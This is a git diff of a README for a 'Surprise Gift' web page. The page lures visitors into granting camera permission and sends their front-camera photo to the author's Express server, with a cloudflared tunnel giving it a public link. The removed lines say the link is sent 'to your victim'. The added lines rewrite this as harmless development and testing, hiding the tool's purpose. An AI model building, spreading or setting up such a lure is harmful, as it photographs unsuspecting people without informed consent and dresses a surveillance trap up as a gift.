@@ -1,10 +1,34 @@
-# Surprise Gift photo capture website
+# 🎁 Surprise Gift photo capture website
 
 A simple web application that shows a "Surprise Gift" opening animation and saves a photo capture using the device's front-facing camera.
 
-## 🚀 How It Works
-* **Frontend**: Shows a bouncing gift box and requests front-facing camera permission. When a user clicks "Unfold It", it plays an animation, captures a frame from the video stream, and sends it to the backend as a Base64 string.
-* **Backend**: An Express.js server running on port 3000 that receives the Base64 image and writes it directly to disk inside an local image folder.
+## ✨ Features
+
+- 🎁 Animated surprise gift
+- 📷 Front camera access
+- 📸 Captures and saves photos
+- ⚡ Express.js backend
+- 📱 Mobile-friendly
+
+## 🛠️ Built With
+
+- HTML5
+- CSS3
+- JavaScript
+- Node.js
+- Express.js
+
+## 📂 Project Structure
+
+```text
+.
+├── index.html
+├── server.js
+├── package.json
+├── package-lock.json
+├── .gitignore
+└── README.md
+```
 
 ## ⚙️ Quick Start
 
@@ -27,18 +51,36 @@ A simple web application that shows a "Surprise Gift" opening animation and save
 ```
 Now the server will start on port 3000. If you want to send it to other person then you can use cloudflared tunnel.
 
-## Cloudflared tunnel
+## 🌐 Optional: Cloudflared Tunnel
 
-To use the cloudflared tunnel you have to install it by:
+Install Cloudflared:
+
 ```bash
 apt install cloudflared -y
 ```
 
-then you can use it on other session after starting the server:
+Expose the local server:
+
 ```bash
 cloudflared tunnel --url http://localhost:3000
 ```
 
-Now the cloudflared will generate a link you can copy it and send it to your victim.
+Cloudflared will generate a temporary public URL for development and testing.
 
-made with love and hardwork of happy!
+## 📖 How It Works
+
+1. Open the website.
+2. Click the gift box.
+3. Allow camera permission.
+4. The app captures a photo.
+5. The server receives and stores the image in the `img` folder.
+
+## 👨‍💻 Author
+
+**Happy**
+
+GitHub: https://github.com/babuhappy531-lab
+
+⭐ If you like this project, consider giving it a star!
+
+Made with LOVE 💕 and HARDWORK 💪 of happy ONLY FOR YOU !!
